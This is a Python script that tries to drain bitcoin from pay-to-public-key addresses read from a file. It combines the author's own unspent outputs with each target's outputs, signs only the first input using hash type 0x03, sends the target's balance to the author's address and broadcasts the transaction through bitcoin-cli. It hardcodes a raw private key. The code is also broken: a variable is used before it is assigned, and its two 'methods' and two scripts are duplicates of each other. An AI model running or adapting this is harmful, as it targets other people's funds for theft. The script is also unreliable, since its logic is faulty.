#!/usr/bin/env python3

import hashlib
import requests
from cryptos import Bitcoin, serialize, sha256, ripemd160
import subprocess
import sys
import time
import pickle
from pprint import pprint

addrmyto='12AgU3LHirufqAXKyxXyYtGMXkJ49C8yTN'
priv=b'\x2a\xad\xba\xa9\x9c\x7a\x63\xe1\x9a\x6a\x39\x18\xac\x40\xe7\x66\x13\xf5\xae\x96\xbc\x63\x32\xac\xdd\x20\xda\x24\x62\x12\x75\x8a'
addrmyfrom='1KkBjUXQ4rrB72PVonzwycJgZe6wXc3k6t'
pubkeymy='048467749ab04de8f93cfec8aa40447efdb191445c7e65673c435330f83ec0ab60832c20c4cced5505f8ff6a07ed13928e4428f2b3932caa3df939cf111ae01ca8'

def sha256hex(h):
	return hashlib.sha256(hex_to_bytes(h)).hexdigest()

def ripemd160hex(h):
	t = hashlib.new('ripemd160')
	d = hex_to_bytes(h)
	t.update(d)
	return t.hexdigest()

def hex_to_bytes(hex_string):
	return bytes.fromhex(hex_string)

def getbal(addr):
	response = requests.get(f"https://blockchain.info/balance?active="+addr)
	if response.status_code == 200:
		return response.json()[addr]['final_balance']
	else:
		print("Error fetching data.",flush=True)
		return None

def getunspent(addr):
	response = requests.get(f"https://blockchain.info/unspent?active="+addr)
	if response.status_code == 200:
		return response.json()['unspent_outputs']
	else:
		print("Error fetching data.",flush=True)
		return None

def mylen(text):
	return str(hex(int(len(text)/2)))[2:]

def method1(ins, outs, scr, priv):
	c = Bitcoin(testnet=False)
	tx = c.mktx(ins, outs)
	tx['locktime'] = 0
	tx['hash_type'] = 0x03
	for i in tx['ins'][1:]:
		i['address']=target
		i['script'] = scr
		i['tx_pos'] = 0
	tx = c.sign(tx, 0, priv)
	return tx

def method2(ins, outs, scr, priv):
	c = Bitcoin(testnet=False)
	tx = c.mktx(ins, outs)
	tx['locktime'] = 0
	tx['hash_type'] = 0x03
	for i in tx['ins'][1:]:
		i['address']=target
		i['script'] = scr
		i['tx_pos'] = 0
	tx = c.sign(tx, 0, priv)
	return tx

c=Bitcoin()
#mine=c.unspent('1KkBjUXQ4rrB72PVonzwycJgZe6wXc3k6t')

import pickle
with open('mine.txt', 'rb') as f:
	mine=pickle.load(f)

for line in open('p2pk.txt'):
	line = line.strip()
	pubkeytarget = line.split(' ')[1]
	target = line.split(' ')[2]

	b = getbal(target)-100000

	pubkeytarget1 = sha256hex(pubkeytarget)
	pubkeytarget2 = ripemd160hex(pubkeytarget1)

	scr1=mylen(pubkeytarget)+pubkeytarget
	scr2=mylen(pubkeytarget)+pubkeytarget

	while his==[]:
		his=[]
		his=c.unspent(target)

	ins = mine + his
	outs = [{'address': addrmyto, 'value': b}]

	tx=method1(ins,outs,scr1,priv)
	t = serialize(tx)
	r=subprocess.run(["/mnt/c/Program Files/Bitcoin/daemon/bitcoin-cli.exe", "sendrawtransaction", t])

	tx=method2(ins,outs,scr1,priv)
	t = serialize(tx)
	r=subprocess.run(["/mnt/c/Program Files/Bitcoin/daemon/bitcoin-cli.exe", "sendrawtransaction", t])

	tx=method1(ins,outs,scr2,priv)
	t = serialize(tx)
	r=subprocess.run(["/mnt/c/Program Files/Bitcoin/daemon/bitcoin-cli.exe", "sendrawtransaction", t])

	tx=method2(ins,outs,scr2,priv)
	t = serialize(tx)
	r=subprocess.run(["/mnt/c/Program Files/Bitcoin/daemon/bitcoin-cli.exe", "sendrawtransaction", t])
